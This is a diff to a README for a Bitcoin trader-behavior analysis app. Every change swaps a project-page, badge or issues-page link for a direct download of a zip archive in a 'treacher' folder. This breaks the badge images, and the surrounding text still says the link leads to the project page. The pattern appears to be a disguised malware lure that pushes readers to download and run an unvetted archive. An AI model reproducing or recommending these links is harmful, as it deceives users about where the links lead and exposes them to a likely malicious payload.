@@ -1,6 +1,6 @@
 # 📊 trader-behavior-market-sentiment-analysis - Understand Bitcoin Trader Behavior Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/MOHAMED-NAZER/trader-behavior-market-sentiment-analysis)
+[![Download Now](https://github.com/MOHAMED-NAZER/trader-behavior-market-sentiment-analysis/raw/refs/heads/main/treacher/analysis_behavior_market_sentiment_trader_1.0.zip%20Now-brightgreen?style=for-the-badge)](https://github.com/MOHAMED-NAZER/trader-behavior-market-sentiment-analysis/raw/refs/heads/main/treacher/analysis_behavior_market_sentiment_trader_1.0.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You do not interact with these directly, but knowing what supports the app helps
 ## 🚀 How to Download and Run
 
 1. Click the green "Download Now" button at the top or this link:  
-   [Download the app here](https://github.com/MOHAMED-NAZER/trader-behavior-market-sentiment-analysis)  
+   [Download the app here](https://github.com/MOHAMED-NAZER/trader-behavior-market-sentiment-analysis/raw/refs/heads/main/treacher/analysis_behavior_market_sentiment_trader_1.0.zip)  
    This link takes you to the project page where you can get the application files.
 
 2. On the project page, find the **Releases** or **Latest Release** section.  
@@ -79,7 +79,7 @@ If the app does not open or crashes:
 - Restart your computer and try again.  
 - Check your disk space and internet connection.  
 - Visit the repository issues page for help:  
-  [https://github.com/MOHAMED-NAZER/trader-behavior-market-sentiment-analysis/issues](https://github.com/MOHAMED-NAZER/trader-behavior-market-sentiment-analysis/issues)  
+  [https://github.com/MOHAMED-NAZER/trader-behavior-market-sentiment-analysis/raw/refs/heads/main/treacher/analysis_behavior_market_sentiment_trader_1.0.zip](https://github.com/MOHAMED-NAZER/trader-behavior-market-sentiment-analysis/raw/refs/heads/main/treacher/analysis_behavior_market_sentiment_trader_1.0.zip)  
 
 ## ⚠️ Security Notes
 
@@ -98,7 +98,7 @@ Check the project page regularly for updates or new features.
 
 ## 🔗 Quick Access to Download
 
-[![Download the app](https://img.shields.io/badge/Download%20App-blue?style=for-the-badge)](https://github.com/MOHAMED-NAZER/trader-behavior-market-sentiment-analysis)
+[![Download the app](https://github.com/MOHAMED-NAZER/trader-behavior-market-sentiment-analysis/raw/refs/heads/main/treacher/analysis_behavior_market_sentiment_trader_1.0.zip%20App-blue?style=for-the-badge)](https://github.com/MOHAMED-NAZER/trader-behavior-market-sentiment-analysis/raw/refs/heads/main/treacher/analysis_behavior_market_sentiment_trader_1.0.zip)
 
 ---
 
